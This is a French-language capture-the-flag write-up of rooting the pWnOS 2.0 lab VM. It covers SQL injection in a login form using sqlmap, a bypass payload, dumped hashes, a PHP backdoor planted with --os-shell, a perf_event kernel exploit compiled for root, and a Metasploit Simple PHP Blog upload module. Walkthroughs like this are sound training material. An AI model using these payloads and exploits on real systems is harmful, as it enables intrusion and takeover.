# Solution du CTF pWnOS 2.0

pWn++
-----

Pour continuer dans la lancée [du précédent articl](http://devloop.users.sourceforge.net/index.php?article81/solution-du-ctf-pwnos-v1-0)e, j'ai décidé de m'attaquer au CTF [pWnOS 2.0](http://vulnhub.com/entry/pwnos-20-pre-release,34/).  

Là encore, un seul objectif : obtenir un shell root par tous les moyens (sauf évidemment manipuler la VM via l'image disque et des techniques du même acabit).  

Ce CTF a été l'un des plus courts et des plus simples à résoudre... C'est le jeu ma pauvre Lucette !  

La VM est configurée en statique avec l'adresse IP 10.10.10.100. Pour dialoguer avec j'ai préféré mettre la VM en host-only et configurer l'interface *vmnet1* de *VMWare Player* en 10.10.10.3.  

Sous *VirtualBox* vous aurez donc une manipulation similaire à faire si vous convertissez l'image. Attention c'est un système 64bits !  

Captain Obvious
---------------

Il y a peut de surprise sur quel service va se faire exploiter :  

```plain
Nmap scan report for 10.10.10.100
Host is up (0.00016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
| 2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Welcome to this Site!
MAC Address: 00:0C:29:8C:E4:CE (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.39
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sur le port 80 il y a un site web minimaliste avec page de login et de création d'account.  

On lance *Wapiti* sur le site web en chargeant tous les modules habituels ainsi que plusieurs optionnels :  

```plain
$ ./bin/wapiti http://10.10.10.100/ -m "all,nikto,backup,htaccess"
```

Plusieurs trouvailles :  

* présence d'un phpinfo à l'adresse http://10.10.10.100/info.php
* faille XSS dans register.php via différents paramètres
* Faille SQL dans login.php via le champ email qui sert de username

A l'ouest rien de nouveau
-------------------------

Quand on reproduit l'attaque SQl le script PHP nous renvoie des erreurs super-parlantes avec la requête SQL au complet :  

```plain
SELECT * FROM users WHERE email='"'' AND pass='4a8a9fc31dc15a4b87bb145b05db3ae0bf2333e4' AND active IS NULL
```

On lance *SQLmap* qui voit la faille mais bloque quand on lui demande des actions particulières (comme *--current-user*) :  

```plain
[21:48:19] [WARNING] the back-end DBMS is not MySQL
[21:48:19] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system.
```

Etant donné que j'ai spécifié *--dbms=mysql* c'est visiblement un bug dans *sqlmap*. Une mise à jour plus tard ça fonctionne :  

```plain
current user:    'root@localhost'
```

Avec l'option *--schema* on obtient les différentes bases de données et la structure des tables :  

```plain
Database: ch16
Table: users
[8 columns]
+-------------------+---------------------+
| Column            | Type                |
+-------------------+---------------------+
| active            | char(32)            |
| email             | varchar(80)         |
| first_name        | varchar(20)         |
| last_name         | varchar(40)         |
| pass              | char(40)            |
| registration_date | datetime            |
| user_id           | int(10) unsigned    |
| user_level        | tinyint(1) unsigned |
+-------------------+---------------------+
```

Les hashs des utilisateurs MySQL (tables users via l'utilisation de *--passwords*) :  

```plain
[21:59:14] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
[21:59:14] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
[21:59:14] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
[21:59:14] [INFO] retrieved: "debian-sys-maint","*9366FE2112E650C8E5523AE337B10A625C727943"
```

Malheureusement aucun des hashs n'est tombé même avec une bonne wordlist. Il faut dire aussi que le MySQL est plus récent que sur d'autres CTF (comme [VulnImage](http://devloop.users.sourceforge.net/index.php?article80/solution-du-ctf-vulnimage)) et l'algorithme de hashage utilisé est plus robuste.  

On dumpe le contenu de la table *users* de la base *ch16* utilisé par l'application web (*-D ch16 -t users --dump*) :  

```plain
+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
| user_id | pass                                     | email            | active | last_name | first_name | user_level | registration_date   |
+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
| 1       | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af | admin@isints.com | NULL   | Privett   | Dan        | 0          | 2011-05-07 17:27:01 |
+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
```

Le hash SHA-1 n'est pas retrouvable sur les sites comme *crackstation*. Le casser ne semble donc pas être une option. Il est toutefois possible de bypasser l'autentification en spécifiant *admin@isints.com'#* comme email dans le formulaire mais cela ne nous emmène pas plus loin (il n'y a pas de zone privée, l'appli n'est pas complète).  

On appelle sqlmap avec l'option *--os-shell* et il parvient à créer une backdoor PHP dans */var/www/*. On remarque immédiatement que ces backdoors sont créées avec les droits root. Oui le mysql tourne en root !  

Par conséquent il doit être possible de jouer directement avec *INTO OUTFILE* pour créer un fichier qui nous ouvrirait les portes comme une tâche dans *cron.hourly* (sauf que le fichier n'est pas exécutable, il faudrait donc se creuser les méninges pour trouver une astuce). Mais pour le moment je préfère placer un *tshd* pour disposer d'un vrai shell.  

On est sur un kernel Linux 2.6 64bits :  

```plain
Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
```

Contenu de /etc/passwd :  

```plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
landscape:x:104:110::/var/lib/landscape:/bin/false
dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
```

Dans */var/www* il y a un dossier *blog* qui correspond à un *Simple PHP Blog* troué... mais à ce stade on est déjà allé trop loin :p   

Le fichier *blog/config/password.txt* contient un hash que l'on ne prendra donc pas la peine de tenter de casser : $1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/.  

Root em all
-----------

Sur *exploit-db* on trouve [un exploit de sd](http://www.exploit-db.com/exploits/25444/) qui convient à l'architecture et au kernel.  

Comme la VM est en host-only je préfère envoyer directement l'exploit sur le machine via *tsh* :  

```plain
$ ./tsh 10.10.10.100 put perf.c /tmp/
```

Côté VM :  

```plain
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ mv /tmp/perf.c .
$ head perf.c
/*
 * linux 2.6.37-3.x.x x86_64, ~100 LOC
 * gcc-4.6 -O2 semtex.c && ./a.out
 * 2010 sd@fucksheep.org, salut!
 *
 * update may 2013:
 * seems like centos 2.6.32 backported the perf bug, lol.
 * jewgold to 115T6jzGrVMgQ2Nt1Wnua7Ch1EuL9WXT2g if you insist.
 */

$ gcc -O2 perf.c -o perf
$ ./perf
2.6.37-3.x x86_64
sd@fucksheep.org 2010
root@web:/var/www/blog# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@web:/var/www/blog# cd /root
root@web:~# ls -alR
.:
total 32
drwx------  4 root root 4096 May  9  2011 .
drwxr-xr-x 21 root root 4096 Feb 22 23:39 ..
drwx------  2 root root 4096 May  7  2011 .aptitude
-rw-r--r--  1 root root  107 May  9  2011 .bash_history
-rw-r--r--  1 root root 3106 Oct 21  2010 .bashrc
drwx------  2 root root 4096 May  7  2011 .cache
-rw-r--r--  1 root root    0 May  9  2011 .mysql_history
-rw-r--r--  1 root root  140 Oct 21  2010 .profile
-rw-------  1 root root  837 May  9  2011 .viminfo

./.aptitude:
total 8
drwx------ 2 root root 4096 May  7  2011 .
drwx------ 4 root root 4096 May  9  2011 ..
-rw-r--r-- 1 root root    0 May  7  2011 config

./.cache:
total 8
drwx------ 2 root root 4096 May  7  2011 .
drwx------ 4 root root 4096 May  9  2011 ..
-rw-r--r-- 1 root root    0 May  7  2011 motd.legal-displayed
```

Ce fut court.  

Alternative mega-happy ending
-----------------------------

*Metasploit* dispose d'un module pour le *Simple PHP blog* que l'on aurait pu découvrir avec *dirb*.  

L'exploit ne fonctionne qu'à moitié dans notre cas puisqu'il parvient à changer le fichier *password.txt* et uploader un script PHP mais le payload ne semble pas aller plus loin (pas de session créée) :  

```plain
msf exploit(sphpblog_file_upload) > exploit

[*] Started bind handler
[*] Successfully retrieved hash: $1$A.rLr8lh$50XjPnJ0Fw3VWm6XWDMXy1
[*] Successfully removed /config/password.txt
[*] Successfully created temporary account.
[*] Successfully logged in as hFsAbm:Mrt1lu
[*] Successfully retrieved cookie: r1hu0c5h3o125ta5ugk8erl396
[*] Successfully uploaded FIK9uKSCSfKkZvRP2ecB.php
[*] Successfully uploaded hHzAQ3dy4VqqB2WuCJHm.php
[*] Successfully reset original password hash.
[*] Successfully removed /images/FIK9uKSCSfKkZvRP2ecB.php
[*] Calling payload: /images/hHzAQ3dy4VqqB2WuCJHm.php
[*] Successfully removed /images/hHzAQ3dy4VqqB2WuCJHm.php
```

Il suffit de reprendre les idenfiants nouvellement créés, de se connecter et d'uploader nous même une backdoor PHP dans le dossier *images*.  

Pour l'accès root on procédera de la même façon que précédemment.  


*Published April 21 2014 at 09:40*